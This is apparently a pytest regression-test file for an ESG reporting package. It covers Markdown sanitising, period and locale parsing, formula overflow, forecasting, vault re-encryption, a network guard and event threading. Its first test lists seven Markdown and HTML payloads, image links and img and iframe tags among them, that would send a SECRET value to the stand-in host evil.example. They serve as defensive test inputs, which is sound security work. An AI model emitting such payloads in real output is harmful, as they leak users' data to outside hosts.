"""Regression tests for issues found by the security and code reviews."""

import socket
import threading
from datetime import datetime

import pandas as pd
import pytest

from esglocal.agents.orchestrator import ESGPipeline
from esglocal.agents.tools import AgentContext
from esglocal.calculator import build_period_table, compute_kpi, period_sort_key, to_number
from esglocal.catalog import Benchmark
from esglocal.embeddings import HashingEmbedder
from esglocal.forecasting import forecast
from esglocal.formula import Formula, FormulaError
from esglocal.llm.fake import FakeLLM
from esglocal.privacy import network_guard
from esglocal.privacy.safe_markdown import safe_markdown
from esglocal.quality import check_quality
from esglocal.rag.store import DocumentStore
from esglocal.scoring import normalise
from esglocal.security.vault import KDF_N, Vault

# ----------------------------------------------- HIGH: browser exfiltration via Markdown


@pytest.mark.parametrize(
    "evil",
    [
        "![x](https://evil.example/p?d=SECRET)",
        "![x][ref]\n\n[ref]: https://evil.example/p?d=SECRET",
        "[click](https://evil.example/?d=SECRET)",
        "[click](//evil.example/?d=SECRET)",
        "<https://evil.example/?d=SECRET>",
        '<img src="https://evil.example/?d=SECRET">',
        "<iframe src=https://evil.example/?d=SECRET></iframe>",
    ],
)
def test_safe_markdown_neutralises_remote_fetches(evil):
    out = safe_markdown(f"Analysis done. {evil} End.")
    assert "https://evil" not in out and "//evil.example" not in out.replace("[:]//", "")
    assert "<img" not in out.lower() and "<iframe" not in out.lower()
    assert "Analysis done." in out


def test_safe_markdown_keeps_normal_content():
    md = "## Findings\n- **GHG** fell 12% (E-GHG-INT)\n\n| a | b |\n|---|---|\n| 1 | 2 |"
    assert safe_markdown(md) == md
    assert safe_markdown("see https://ghgprotocol.org") == "see https[:]//ghgprotocol.org"


# --------------------------------------------------------- period handling / parsing


def test_periods_sort_chronologically_and_drop_missing(catalog, inputs):
    df = pd.DataFrame({"year": [9, 10, None], "fatal": [1, 2, 99]})
    table = build_period_table(df, {"fatalities": "fatal"}, inputs)
    assert list(table.index) == ["9", "10"]
    assert compute_kpi(catalog.kpi("S-FATALITIES"), table).value == 2
    assert sorted(["FY2023", "2022", "FY2021"], key=period_sort_key) == ["2022", "FY2021", "FY2023"]


def test_dates_give_same_periods_before_and_after_reload(inputs):
    dates = [datetime(2023, 1, 1), datetime(2023, 6, 1), datetime(2024, 1, 1)]
    live = pd.DataFrame({"date": dates, "fatal": [1, 1, 3]})
    reloaded = pd.DataFrame({"date": [str(d) for d in dates], "fatal": [1, 1, 3]})
    t1 = build_period_table(live, {"fatalities": "fatal"}, inputs)
    t2 = build_period_table(reloaded, {"fatalities": "fatal"}, inputs)
    assert list(t1.index) == list(t2.index) == ["2023", "2024"]
    assert t1["fatalities"].tolist() == t2["fatalities"].tolist() == [2, 3]


def test_locale_number_parsing():
    s = to_number(pd.Series(["1,234", "1.234,5", "1,5", "(5)", "-3%", "1,234.5", "12 %", "x"]))
    assert s.tolist()[:7] == [1234.0, 1234.5, 1.5, -5.0, -3.0, 1234.5, 12.0]
    assert pd.isna(s.iloc[7])


def test_failed_latest_period_is_flagged(catalog, inputs, assessment):
    df = pd.DataFrame({"year": [2023, 2024], "lti": [5, 5], "hours": [1e6, 0]})
    table = build_period_table(df, {"lost_time_injuries": "lti", "hours_worked": "hours"}, inputs)
    res = compute_kpi(catalog.kpi("S-LTIFR"), table)
    assert res.period == "2023" and "2024" in res.note
    assessment.results.append(res)
    assert any("2024" in i.message for i in check_quality(catalog, assessment, table))


def test_nan_benchmark_does_not_score_100():
    assert normalise(5, Benchmark(float("nan"), float("nan"))) is None
    assert normalise(float("inf"), Benchmark(10, 0)) is None


def test_formula_overflow_is_a_formula_error():
    with pytest.raises(FormulaError):
        Formula("9" * 400)
    with pytest.raises(FormulaError):
        Formula("a * a * a * a").evaluate({"a": 1e300})


def test_forecast_unequal_gaps_and_unsorted():
    fc = forecast({"2023": 3.0, "2020": 0.0, "2022": 2.0}, horizon=1)
    assert fc.slope_per_period == pytest.approx(1.0)
    assert fc.values[0] == pytest.approx(4.0)
    assert forecast({"2022": 1.0, "nan": 2.0}) is not None  # falls back to index axis


# ----------------------------------------------------------------------- security


def test_passphrase_change_reencrypts_documents(tmp_path):
    v = Vault(tmp_path / "v.db")
    store = DocumentStore(tmp_path / "d.db", HashingEmbedder(), v.encrypt_bytes, v.decrypt_bytes)
    store.add("policy.md", "Anonymous whistleblowing hotline run by a third party.")
    v.change_passphrase("new long passphrase", rekey=[store.reencrypt])
    hits = store.search("whistleblowing hotline")
    assert hits and "third party" in hits[0].text
    assert int(v._meta("kdf_n")) == KDF_N


def test_guard_blocks_udp_sendto():
    network_guard.install()
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        with pytest.raises(network_guard.NetworkBlockedError):
            s.sendto(b"x", ("8.8.8.8", 53))
        s.sendto(b"x", ("127.0.0.1", 9))  # loopback still fine
        s.close()
    finally:
        network_guard.uninstall()


# ------------------------------------------------------------- threading / UI events


def test_events_delivered_on_caller_thread(catalog, industry, assessment, table):
    caller = threading.get_ident()
    threads = set()

    def on_event(ev):
        threads.add(threading.get_ident())

    ctx = AgentContext(catalog, industry, assessment, table, {})
    ESGPipeline(FakeLLM(), ctx, on_event=on_event, concurrency=3).run()
    assert threads == {caller}
